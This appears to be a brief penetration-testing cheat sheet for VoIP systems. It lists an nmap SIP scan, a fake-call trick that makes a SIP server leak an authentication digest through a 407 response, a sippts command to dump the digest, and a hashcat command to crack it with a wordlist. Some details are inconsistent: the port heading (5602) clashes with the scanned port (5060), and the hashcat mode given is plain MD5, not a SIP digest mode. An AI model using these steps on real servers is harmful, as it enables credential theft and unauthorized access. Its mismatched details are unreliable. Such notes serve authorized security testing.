# Voice over IP Penetration Testing

Port 5602 UDP

## VoIP config enumeration

### 1) Nmap Scan

    sudo nmap -sU -p 5060 --script sip-methods IP

Potential attack vector: VoIP responder on the target has a predefined wildcard 

    <recv response="*">

## Exploitation

### 1) Session Initiation Protocol (SIP) digest leak

Make a fake call to the server by creating a custom call scenario to send 407 Proxy Auth Required instead of ACK when BYE is received from server.

The 407 Proxy authentication required request indicates that the client must now authenticate itself with the proxy.

#### Dump digest

    sippts leak -i IP

#### Crack MD5 hash

    hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

